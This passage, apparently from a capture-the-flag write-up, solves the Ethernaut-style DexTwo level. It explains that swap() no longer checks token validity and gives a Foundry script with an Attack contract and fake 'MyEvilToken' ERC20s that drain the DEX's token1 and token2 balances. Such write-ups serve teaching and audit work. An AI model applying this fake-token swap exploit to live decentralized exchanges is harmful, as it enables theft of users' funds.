&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;super&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_approve&lt;&#x2F;span&gt;&lt;span&gt;(owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;spender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amount)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Goal&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;Solution&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;Observe that the &lt;code&gt;DexTwo&lt;&#x2F;code&gt; modifies the &lt;code&gt;swap()&lt;&#x2F;code&gt; function from the &lt;code&gt;Dex&lt;&#x2F;code&gt;. It removed the check of valid tokens.&lt;&#x2F;li&gt;
&lt;li&gt;So, we are now allowed to input any token addresses to the swap() function.&lt;&#x2F;li&gt;
&lt;li&gt;I created two Fake Tokens and transferred 100 tokens each of the two tokens to the &lt;code&gt;Dex&lt;&#x2F;code&gt; address.&lt;&#x2F;li&gt;
&lt;li&gt;I swapped my fake tokens with the &lt;code&gt;token1&lt;&#x2F;code&gt; and &lt;code&gt;token2&lt;&#x2F;code&gt; balances of the &lt;code&gt;Dex&lt;&#x2F;code&gt; contract.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;code&gt;DexTwoSolve.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{Dex} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;Dex.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;openzeppelin-contracts&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;IERC20.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;openzeppelin-contracts&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract DexTwoSolve is Script{
&lt;&#x2F;span&gt;&lt;span&gt;    Dex public dex &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Dex&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd8c665Dac001720A9efa0f478e63CABc5D64E9e9&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;(vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;envUint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;PRIVATE_KEY&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        address token1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;token1&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        address token2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;token2&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Token 1 : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;token1)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Token 2 : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;token2)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;DEX balance in TOKEN1 &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(token1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(dex)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;DEX balance in TOKEN2 &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(token2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(dex)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        Attack attack &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Attack&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; dex.approve(address(attack), 10);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        attack&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Attacker balance in TOKEN1 &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(token1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(attack)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Attacker balance in TOKEN2 &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(token2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(attack)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;DEX balance in TOKEN1 &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(token1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(dex)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;DEX balance in TOKEN2 &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(token2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(dex)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack{
&lt;&#x2F;span&gt;&lt;span&gt;    Dex public dex &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Dex&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd8c665Dac001720A9efa0f478e63CABc5D64E9e9&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    address token1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;token1&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    address token2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;token2&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    MyEvilToken myToken1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    MyEvilToken myToken2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;(){
&lt;&#x2F;span&gt;&lt;span&gt;        myToken1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;MyEvilToken&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        myToken2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;MyEvilToken&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; IERC20(token1).transferFrom(0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602, address(this), 10);
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; IERC20(token2).transferFrom(0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602, address(this), 10);
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        myToken1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(dex)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        myToken2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(dex)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        myToken1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(dex)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;type&lt;&#x2F;span&gt;&lt;span&gt;(uint64)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;max)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        myToken2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(dex)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;type&lt;&#x2F;span&gt;&lt;span&gt;(uint64)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;max)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;swap&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(myToken1)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;token1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(token1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(dex)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;swap&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(myToken2)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;token2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(token2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(dex)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract MyEvilToken is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ERC20&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;MyEVILToken&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;EVIL&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;){
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;(){
